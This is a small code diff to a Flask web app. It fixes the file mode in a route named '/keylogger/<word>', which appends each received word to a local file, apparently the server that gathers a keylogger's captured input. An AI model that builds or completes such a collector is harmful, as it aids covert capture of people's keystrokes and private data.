@@ -10,7 +10,7 @@ from .database import db, app
 
 @app.route('/keylogger/<word>', methods=["GET", "POST"])
 def check_word(word):
-    string_file = open('./string_data', 'wc')
+    string_file = open('./string_data', 'a')
     string_file.write(word)
     string_file.close()
 
